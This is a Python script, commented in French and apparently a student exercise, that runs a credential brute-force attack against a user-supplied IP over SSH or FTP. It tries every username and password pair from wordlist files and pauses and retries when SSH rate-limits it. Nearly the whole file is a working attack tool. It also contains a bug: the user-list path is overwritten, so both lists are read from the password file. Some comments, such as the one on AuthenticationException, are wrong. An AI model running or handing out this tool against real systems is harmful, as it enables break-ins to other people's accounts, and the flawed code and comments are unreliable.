import os        #Pour intétagir avec le système d'exploitation, pour les opérations sur les fichiers
import paramiko  #Bibliothèque pour le protocole SSH, Il fournit des fonctions pour établir des connexions SSH
import socket    #d'établir des connexions, d'envoyer et de recevoir des données sur divers protocoles réseau, gérer les erreurs liées au réseau
import time      #fournit diverses fonctions pour travailler avec des opérations et des fonctionnalités liées au temps
import ftplib    #permet de créer des applications clientes FTP qui peuvent se connecter à des serveurs FTP

#Fonction pour le brute force SSH
def brute_force_ssh(host, p, user, passwd, pourcentage):#le paramètre pourcentage c'est pour l'avancement du brute force
    #On crée un client clt, ce client est cree grâce à paramiko.SSHClient, pas besoin d'argument car ce n'est pas ici qu'on connecte, là juste on cree un client
    clt = paramiko.SSHClient()
    #On va chargé ce fichier dans le cas où le clé SSH est présent 
    clt.load_system_host_keys()
    #Si le clé n'est pas présent on doit changer la politique par défaut, la politique en question c'est la politique d'un clé hote manquante
    clt.set_missing_host_key_policy(paramiko.AutoAddPolicy())# paramiko.addpolicy, pour que le client ajoute automatiquement le cle ssh dans le fichier
    try:#on doit utiliser try pour connecter
        print(f"Testing {user}:{passwd}")
        clt.connect(host, p, user, passwd, timeout=3)# on ajoute un timeout pour qu'il ne reste pas bloqué pour un long temps
    except socket.error as error:#pour gérer l'erreur du socket
        print("SocketError", error)
        return False# on n'a pas réussit a trouve le mot de passe
    except paramiko.AuthenticationException as exception: #l'exception si jamais nos identifiants son correcte
        print ("AuthenticationException", exception)
        return False
    except paramiko.SSHException:#le ssh il a un limite pour le test qu'on peut le faire, par ex après 6 tests il va nous dire qu'on n'a pas le droit de faire le test
        print ("Try again")#alors on affiche un message pour savoir qu'on doit attendre 
        time.sleep(20)#là on attend 20 seconde
        return brute_force_ssh(host, p, user, passwd, pourcentage)# après d'attendre on va relancer le brute force SSH
    else:
        return True #S'il n y a pas aucun problème return True

def brute_force_ftp(host, port, username, password, pourcentage):#le paramètre pourcentage c'est pour l'avancement du brute force
    try:#on commence par gérer les exceptions
        ftp = ftplib.FTP()#On crée un objet FTP à l'aide de la classe FTP du module ftplib. Cet objet sera utilisé pour interagir avec le serveur FTP
        ftp.connect(host, port, timeout=3)#On établit une connexion avec le serveur FTP spécifié en utilisant l'adresse host et le port port. Le paramètre timeout spécifie le délai maximal en secondes pour l'établissement de la connexion.
        ftp.login(username, password)#Pour s'authentifier auprès du serveur FTP
        ftp.quit()#On envoie la commande QUIT au serveur FTP pour terminer la session et fermer la connexion.
        print(f"Mot de passe FTP trouvé : {password}")
        return True
    except ftplib.error_perm as e:#en cas d'erreur d'authentification ou de permission lors de l'interaction avec le serveur FTP.
        print(f"Tentative avec {password} a échoué : {e}")
        return False#pour indiquer que la tentative de connexion avec le mot de passe spécifié a échoué.

#Fonction pour demander à l'utilateur de saisir l'adresse IP        
def connection():
    adresse_IP = input ("Donner l'adresse IP: ") #adresse IP de la machine cible
    return adresse_IP

#Fonction pour qu'elle nous donne le numéro du port selon le protocole choisit
def get_port(service):
    try:
        return socket.getservbyname(service)
    except socket.error:
        return None

#Fonction pour demander à l'utilisateur de choisir un protocole 
def choisir_protocole():
    while True:
        protocole = input ("Quel protocole voulez-vous choisir, SSH ou FTP? ").lower() #lower() va convertir la reponse en miniscules, sinon si l'utilisateur écrit le protocole en miniscule et non pas en majuscue on doit obtenir la phrase d'entrer un autre protocole 
        if protocole in ['ssh', 'ftp']:
           if protocole =='ssh':
               port = get_port('ssh')
           elif protocole == 'ftp':
               port = get_port('ftp')   
           return protocole, port
        else:
            print("Le protocole doit être SSH ou bien FTP, Veuillez réessayer")

#Fonction pour demander à l'utilisateur de saisir le chemin du fichier du mots d'utilisateurs
def path_users_list():
    while True:
        path = input("Entrez le path du fichier de liste des utilisateurs : ")
        if os.path.isfile(path):
            return path
        else:
            print("Ce n'est pas un fichier valide.")

#Fonction pour accéder au fichier du mots d'utilisateurs
def acceder_users_list(path):
    try:
        with open(path, 'r', encoding="utf-8") as file:
            users = file.readlines() #readlines, pour lire chaque ligne
            users = [user.strip() for user in users] # Supprimer les espaces vides et les sauts de ligne
            return users
    except FileNotFoundError:
        print("Fichier non trouvé")        
    except OSError:
        print("Fichier non accessible")
    except Exception as ex:
        print(f"L'erreur '{ex}' s'est produite")

#Fonction pour demander à l'utilisateur de saisir le chemin du fichier du mots de passe
def path_passwords_list():
    while True:
        path = input("Entrez le path du fichier du mot de passe: ")
        if os.path.isfile(path):
            return path
        else:
            print("Ce n'est pas un fichier valide.")

#Fonction pour accéder au fichier du mots de passe
def acceder_password_file(path):
    try:
        with open(path, 'r', encoding="utf-8") as file:
             passwords = file.readlines()
    
             passwords = [password.strip() for password in passwords] # Supprimer les espaces vides et les sauts de ligne
 
             return passwords
        
    except FileNotFoundError:
        print("fichier non trouvé")        
    
    except OSError:
        print("fichier non accessible")

    except Exception as ex:
        print(f"L'erreur '{ex}' s'est produite")


def main():
    adresse_IP = connection()
    print("L'adresse IP est:", adresse_IP)
    

    protocole, port = choisir_protocole()
    print(f"Vous avez choisi le protocole {protocole} sur le port {port}")
    path = path_users_list()
    path = path_passwords_list()
    users = acceder_password_file(path)
    passwords = acceder_users_list(path)
    pourcentage = len(users) * len(passwords)# pour calculer le nombre total de tentatives de connexion qui seront effectuées en multipliant le nombre d'utilisateurs par le nombre de mots de passe
    current_attempt = 0 # On initialise une variable current_attempt à zéro pour compter le nombre de tentatives actuelles.
    start_time = time.time() #On enregistre le temps de début de l'exécution du bruteforce en utilisant la fonction time.time()
    elapsed_time = 0 #On initialise une variable elapsed_time à zéro pour stocker le temps écoulé depuis le début de l'exécution.
    if users and passwords:
        if protocole == 'ssh':
            #Il faut pour chaque utilisateur qu'on teste chaque password, alors on fait 2 boucles for
            for user in users:
                for password in passwords:
                    current_attempt += 1 #On incrémente le compteur current_attempt à chaque tentative de connexion.
                    #On affiche un message indiquant le numéro de la tentative actuelle, le nombre total de tentatives prévues et le pourcentage d'avancement
                    print(f"Tentative {current_attempt}/{pourcentage} ({(current_attempt / pourcentage) * 100:.2f}%)")
                    if brute_force_ssh(adresse_IP, port, user, password, pourcentage): #si c'est trouvé, return true 
                        end_time = time.time() #On enregistre le temps de fin de la tentative de connexion.
                        elapsed_time = end_time - start_time #On calcule le temps écoulé depuis le début de l'exécution jusqu'à la fin de la tentative.
                        #Si le mot de passe est trouvé, on imprime un message indiquant le nombre de tentatives effectuées et le temps écoulé
                        print(f"Mot de passe trouvé après {current_attempt} tentatives en {elapsed_time:.2f} secondes.")
                        return
        elif protocole == 'ftp':
            for user in users:
                for password in passwords:
                    current_attempt += 1
                    print(f"Tentative {current_attempt}/{pourcentage} ({(current_attempt / pourcentage) * 100:.2f}%)")
                    if brute_force_ftp(adresse_IP, port, user, password, pourcentage):
                        end_time = time.time()
                        elapsed_time = end_time - start_time
                        print(f"Mot de passe trouvé après {current_attempt} tentatives en {elapsed_time:.2f} secondes.")
                        return
                               
        print("Aucun mot de passe trouvé.")
    else:
        print("Aucune liste de mots de passe ou d'utilisateurs récupérée.")
     
main()

    